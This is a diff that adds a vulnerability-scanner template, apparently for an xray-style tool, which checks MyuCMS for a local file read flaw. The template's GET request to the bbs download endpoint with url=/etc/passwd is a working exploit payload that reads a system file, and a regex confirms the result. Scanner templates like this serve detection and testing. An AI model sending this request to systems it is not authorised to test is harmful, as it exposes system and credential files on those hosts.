@@ -1,0 +1,18 @@
+id: myucms-lfr
+
+info:
+    name: myucms-lfr
+    author: jinqi
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0()
+
